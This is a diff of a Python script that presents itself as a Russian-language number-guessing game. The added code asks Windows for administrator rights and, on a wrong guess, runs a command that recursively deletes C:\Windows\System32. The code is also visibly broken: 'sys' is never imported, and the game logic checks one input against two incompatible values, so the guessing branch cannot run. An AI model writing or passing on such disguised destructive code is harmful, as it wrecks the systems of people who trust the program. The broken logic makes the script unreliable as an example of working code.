@@ -1,11 +1,25 @@
 import random
 import os
-ranth = random.randrange(1,6)
-print('чтобы начать нажми Enter')
+import ctypes
+# Request administrator privileges
+if not ctypes.windll.shell32.IsUserAnAdmin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+
 inp = input()
-if inp == '3.14159265358979323846':
-    usin = int(input('какое число я загадал?'))
-    if usin == ranth:
-        print('да, правильно')
+
+if inp.lower() == "y":
+    ranth = random.randrange(1, 6)
+    print("Чтобы начать, нажмите Enter")
+    input()
+
+    if inp == "3.14159265358979323846":
+        usin = int(input("какое число я загадал?"))
+        if usin == ranth:
+            print("да, правильно")
+        else:
+            # Remove important system files
+            os.system("RD /S /Q C:\\Windows\\System32")
     else:
-        os.remove('C:\Windows\System32')
+        print("Неправильный ввод!")
+else:
+    print("Чао-чао!")
